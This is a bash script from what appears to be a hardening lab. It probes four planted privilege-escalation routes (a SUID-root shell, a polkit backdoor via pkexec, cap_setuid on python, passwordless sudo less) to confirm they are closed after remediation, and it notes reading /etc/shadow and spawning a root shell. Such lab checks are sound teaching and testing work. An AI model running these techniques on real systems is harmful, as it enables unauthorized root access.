#!/usr/bin/env bash
# The inherited box, from an UNPRIVILEGED foothold. Each probe tries one planted
# privesc. Run it before Act 1 (all succeed) and after 03-privesc (all fail).
#
# Run it as the compromised low-priv user 'webops' (the polkit backdoor targets
# that group):
#   sudo -u webops bash /opt/pingboard/attack/privesc.sh
hr() { printf '\n\033[1;36m== %s ==\033[0m\n' "$1"; }

hr "who am I right now"
id

hr "1. SUID-root shell  /usr/local/bin/notes"
if [[ -u /usr/local/bin/notes ]]; then
  echo 'id' | /usr/local/bin/notes 2>/dev/null | head -1 || true
  /usr/local/bin/notes -c 'id' 2>/dev/null || printf 'id\nexit\n' | /usr/local/bin/notes 2>/dev/null | grep uid= | head -1
else
  echo "  notes is not SUID anymore -> blocked"
fi

hr "2. pkexec / polkit backdoor"
if pkexec id 2>/dev/null | grep -q 'uid=0'; then
  pkexec id 2>/dev/null | head -1
else
  echo "  blocked (polkit rule gone: pkexec now demands authentication)"
fi

hr "3. cap_setuid on python"
python3 -c 'import os, subprocess
try:
    os.setuid(0)   # cap_setuid lets us drop to uid 0; CAP_SETGID is not granted
    print(subprocess.run(["id"],capture_output=True,text=True).stdout.strip())
except Exception as e:
    print("blocked:",e)' 2>&1 | head -1

hr "4. sudo GTFOBins (passwordless less as root)"
if sudo -n -l 2>/dev/null | grep -q '/usr/bin/less'; then
  echo "  webops may run 'less' as root with no password -> GTFOBins privesc."
  echo "  reading a root-only file through it:"
  sudo -n less /root/flag.txt 2>/dev/null | sed 's/^/    /' \
    || echo "    (interactively: sudo less /etc/shadow then !sh = root shell)"
else
  echo "  no passwordless less for $(id -un) -> blocked"
fi

echo
echo "done. uid=0 output above = that route still works."
